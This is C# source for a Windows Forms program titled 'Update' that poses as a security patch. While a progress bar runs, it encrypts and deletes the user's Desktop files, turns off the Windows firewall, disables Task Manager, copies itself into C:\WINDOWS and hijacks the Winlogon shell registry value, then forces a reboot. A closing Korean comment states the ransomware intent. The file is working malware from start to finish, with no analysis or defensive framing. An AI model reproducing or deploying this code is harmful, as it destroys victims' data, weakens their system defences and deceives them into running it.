using System;
using System.IO;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

using System.Security.Principal;
using System.Security.Cryptography; // ENC 
using System.Diagnostics;
using Microsoft.Win32;

namespace AttaQ
{
    public partial class Update : Form
    {
        static string key = "password";

        static void EncryptFile(string ReadFilename, string WriteFilename)  //파일 암호화
        {
            FileStream fsInput = new FileStream(ReadFilename, FileMode.Open, FileAccess.Read, FileShare.None);
            FileStream fsEncrypted = new FileStream(WriteFilename, FileMode.Create, FileAccess.Write);

            DESCryptoServiceProvider DES = new DESCryptoServiceProvider();
            DES.Key = ASCIIEncoding.ASCII.GetBytes(key);
            DES.IV = ASCIIEncoding.ASCII.GetBytes(key);

            ICryptoTransform Encrypt = DES.CreateEncryptor();
            CryptoStream cryptostream = new CryptoStream(fsEncrypted, Encrypt, CryptoStreamMode.Write); // 암호화 진행

            byte[] bytearrayinput = new byte[fsInput.Length];
            fsInput.Read(bytearrayinput, 0, bytearrayinput.Length); // 원본 읽기

            cryptostream.Write(bytearrayinput, 0, bytearrayinput.Length);   // 암호화파일 생성
            fsEncrypted.Flush();
            cryptostream.Close();
            fsInput.Close();
            fsEncrypted.Close();

            System.IO.File.Delete(ReadFilename);    // 원본파일 삭제
                                                    // Console.Write("\nEncript To " + WriteFilename + " !!!");
        }

        static void ransomware()
        {

            // Ransomware Start
            string mydocpath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);    // 내문서 경로 얻기
            string localpath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);        // 바탕화면 경로얻기
            string[] filename = Directory.GetFiles(localpath, "*.*", SearchOption.AllDirectories);

            // string extens = ".bak";
            int i=0,j=0;

            string[] exfile = new string[filename.Length];

            for (i = 0; i < filename.Length; i++)
            {
                string now = filename[i];
                //MessageBox.Show(now);
                //if (Path.GetExtension(now).Equals(extens))
                if(now != Application.ExecutablePath && Path.GetExtension(now) != ".qtaeq")
                {
                    exfile[j] = now;
                    j++;
                }
            }
            string output = "";
            for (i = 0; i < j; i++)
            {
                EncryptFile(exfile[i], localpath + "\\" + Path.GetFileName(exfile[i]) + ".qtaeq");
                output += exfile[i] + Environment.NewLine;
            }

            // Log Create
            FileStream log_q = new FileStream("C:\\WINDOWS\\log.q", FileMode.Create, FileAccess.Write);
            log_q.Write(Encoding.UTF8.GetBytes(output), 0, output.Length);
            log_q.Close();

            /*
            // Directory Clear
            string[] dir = Directory.GetDirectories(localpath);
            for(i = 0; i < dir.Length; i++) {
                Directory.Delete()
            }
            */
            
        }

        static void firewall()
        {
            // 방화벽 설정 해제
            Process cmd = new Process();
            cmd.StartInfo.FileName = "cmd.exe";
            cmd.StartInfo.RedirectStandardInput = true;
            cmd.StartInfo.RedirectStandardOutput = true;
            cmd.StartInfo.CreateNoWindow = true;
            cmd.StartInfo.UseShellExecute = false;
            cmd.Start();

            cmd.StandardInput.Write(@"netsh advfirewall set allprofiles state off" + Environment.NewLine);
            cmd.StandardInput.Write(@" netsh f s o d" + Environment.NewLine);   // lunch in WinXP
            cmd.StandardInput.Flush();
            cmd.StandardInput.Close();
            cmd.WaitForExit();
            // MessageBox.Show(cmd.StandardOutput.ReadToEnd());

        }

        static void taskmgr()
        {
            // 작업관리자 사용 불가 설정
            RegistryKey reg;
            int boll = 1;
            reg = Registry.CurrentUser.CreateSubKey(@"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            reg.SetValue("Disabletaskmgr", boll);
            reg.Close();
            // HKEY_CURRRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\Disabletaskmgr

        }

        static void copyme()
        {
            string readFile = Application.ExecutablePath;
            string WriteFile = "C:\\WINDOWS\\hacked.exe";    // 바탕화면

            FileInfo finfo = new FileInfo(readFile);
            if (finfo.Exists)
            {
                FileStream fsInput = new FileStream(readFile, FileMode.Open, FileAccess.Read, FileShare.None);
                FileStream fsOutput = new FileStream(WriteFile, FileMode.Create, FileAccess.Write);
                byte[] bytearrayinput = new byte[fsInput.Length];
                fsInput.Read(bytearrayinput, 0, bytearrayinput.Length); // 원본 읽기

                fsOutput.Write(bytearrayinput, 0, bytearrayinput.Length);
                fsOutput.Close();
                fsInput.Close();
            }
            else
                MessageBox.Show("NOFILE!");

            RegistryKey reg;

            string tex = "C:\\WINDOWS\\hacked.exe";
            reg = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
            // SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\shell
            reg.SetValue("shell", tex);
            reg.Close();

        }
        


        public Update()
        {
            InitializeComponent();
        }

        private void Update_Load(object sender, EventArgs e)
        {
            this.FormBorderStyle = FormBorderStyle.FixedSingle;
            // Form Size 고정

            
        }

        private void Bt_start_Click(object sender, EventArgs e)
        {
            progressBar1.Value = 20;
            ransomware();
            progressBar1.Value += 20;
            //MessageBox.Show("ransomware!");

            firewall();
            progressBar1.Value += 20;
            //MessageBox.Show("firewall!");

            taskmgr();
            progressBar1.Value += 20;
            //MessageBox.Show("taskmgr!");

            copyme();
            progressBar1.Value += 20;
            //MessageBox.Show("copyme!");

            MessageBox.Show("보안업데이트 적용을 위해 재부팅합니다.");


            System.Diagnostics.Process.Start("shutdown.exe", "-r -t 1");
            Application.Exit();

        }

 
    }
}

/******* 프로그램 기능 ( 업데이트 진행 )
 *   - 보안 패치 진행시 프로세스바 보여주면서 랜섬웨어 감염 _
 *   - 방화벽 설정 해제 및 레지스트리 변경
 *   - Kill Process 및 재부팅
 *   - 자기자신 파일 복사 (C\Windows)및 시작프로그램 레지스트리에 등록
 * 
 */